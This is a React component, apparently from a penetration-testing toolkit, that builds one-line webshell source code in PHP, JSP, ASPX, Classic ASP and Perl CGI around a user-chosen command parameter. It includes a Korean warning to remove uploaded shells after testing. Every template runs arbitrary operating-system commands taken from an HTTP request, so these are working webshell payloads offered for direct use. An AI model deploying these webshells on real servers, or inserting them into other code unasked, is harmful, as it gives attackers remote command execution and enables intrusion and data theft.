import { useState } from 'react'
import { DISCLAIMER, Note, Pick, Readout, TextInput } from './shared'

export function WebshellPayloadBuilder() {
  const [lang, setLang] = useState<'PHP' | 'JSP' | 'ASPX' | 'ASP' | 'Perl'>('PHP')
  const [param, setParam] = useState('cmd')

  const getCode = (lang: string, p: string) => {
    switch (lang) {
      case 'PHP':
        return `<?php if(isset(\$_REQUEST['${p}'])){system(\$_REQUEST['${p}']);} ?>`
      case 'JSP':
        return `<% if(request.getParameter("${p}")!=null){ Runtime.getRuntime().exec(request.getParameter("${p}")); } %>`
      case 'ASPX':
        return `<%@ Page Language="C#" %><% if(Request["${p}"]!=null){ System.Diagnostics.Process.Start("cmd.exe","/c "+Request["${p}"]); } %>`
      case 'ASP':
        return `<% Set o = Server.CreateObject("WScript.Shell") : Response.Write(o.Exec(Request("${p}")).StdOut.ReadAll()) %>`
      case 'Perl':
        return `#!/usr/bin/perl\nuse CGI;\nmy $q = CGI->new;\nprint $q->header('text/plain');\nmy $c = $q->param('${p}');\nprint \`$c\`;`
      default:
        return ''
    }
  }

  return (
    <div className="payload-builder">
      <Note>{DISCLAIMER}</Note>
      <div className="webshell-cleanup-warning">
        ⚠️ 경고: 테스트 종료 후 업로드한 웹쉘 파일은 반드시 삭제하고 보고서에 기록하십시오. 서버에 방치된 웹쉘은 치명적인 2차 피해를 유발할 수 있습니다.
      </div>

      <Pick label="언어 선택" value={lang} onChange={setLang} options={[
        { id: 'PHP', label: 'PHP' },
        { id: 'JSP', label: 'JSP' },
        { id: 'ASPX', label: 'ASPX' },
        { id: 'ASP', label: 'ASP (Classic)' },
        { id: 'Perl', label: 'Perl (CGI)' },
      ]} />
      <TextInput label="명령 실행 파라미터 이름" value={param} onChange={setParam} placeholder="cmd" />
      
      <div className="payload-readout-group">
        <strong className="payload-group-title">웹쉘 소스코드</strong>
        <Readout title={`${lang} Webshell`} value={getCode(lang, param)} wrap="pre" />
      </div>
    </div>
  )
}

export default WebshellPayloadBuilder
